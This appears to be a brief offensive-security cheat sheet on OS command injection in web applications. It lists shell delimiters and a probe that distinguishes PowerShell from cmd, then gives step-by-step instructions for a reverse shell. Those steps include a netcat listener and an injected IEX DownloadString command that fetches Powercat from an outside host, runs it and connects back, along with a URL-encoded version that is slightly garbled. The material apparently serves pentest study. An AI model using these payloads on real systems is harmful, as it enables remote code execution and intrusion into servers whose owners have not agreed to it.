> When, instead of using pre-defined functions to interact with the system, a web application directly accepts user input then sanitizes it.

(Linux) Command delimiters:
- `;` or `%3B`
- `&&` (specifies two consecutive commands)

(Windows) Command delimiters:
- `;` or `%3B`
- `&`

(Windows) Check if code is being executed in PS or cmd:
- (dir 2>&1 \*\`|echo CMD);&<# rem #>echo PowerShell
- with URL encoding: `(dir%202%3E%261%20*%60%7Cecho%20CMD)%3B%26%3C%23%20rem%20%23%3Eecho%20PowerShell`

Powershell webshell using Powercat:
1. Powercat file is located in Kali at `/usr/share/powershellempire/empire/server/data/module_source/management/powercat.ps1`
2. Host a server containing Powercat
3. Prepare netcat listener: `nc -nvlp 4444`
4. Inject command `IEX (New-Object System.Net.Webclient).DownloadString("http://192.168.119.3/powercat.ps1");powercat -c 192.168.119.3 -p 4444 -e powershell` to download and run Powercat on the web application server
   With URL encoding: `IEX%20(NewObject%20System.Net.Webclient).DownloadString(%22http%3A%2F%2F192.168.119.3%2Fpowercat .ps1%22)%3Bpowercat%20-c%20192.168.119.3%20-p%204444%20-e%20powershell' http://192.168.50.189:8000/archive`

Note: Could also inject a PowerShell reverse shell directly.
